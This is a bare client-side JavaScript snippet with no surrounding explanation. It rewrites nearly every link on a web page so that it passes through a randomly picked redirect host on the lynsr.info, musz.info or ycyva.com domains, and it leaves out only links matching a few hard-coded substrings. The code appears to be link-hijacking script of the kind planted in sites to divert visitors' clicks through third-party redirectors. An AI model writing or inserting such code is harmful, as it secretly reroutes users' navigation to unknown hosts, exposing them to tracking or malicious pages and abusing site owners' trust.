var links = document.links;
for (var i=0, iLen=links.length; i<iLen; i++) {
var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://re.ycyva.com/?', 'http://rk.ycyva.com/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?', 'http://rg.ycyva.com/?', 'http://rt.ycyva.com/?', 'http://rv.ycyva.com/?', 'http://ry.ycyva.com/?'];  
var random  = threads[Math.floor(Math.random() * threads.length)];
var hrefer = document.links[i].href;
if(hrefer.match("av.a") || hrefer.match("ojjoio")|| hrefer.match("ce.a")|| hrefer.match("ce.n")|| hrefer.match("ja.a")|| hrefer.match("xx.m")) {
document.links[i].href = document.links[i].href; 
 }else{links[i].href = random + links[i].href;}
 }
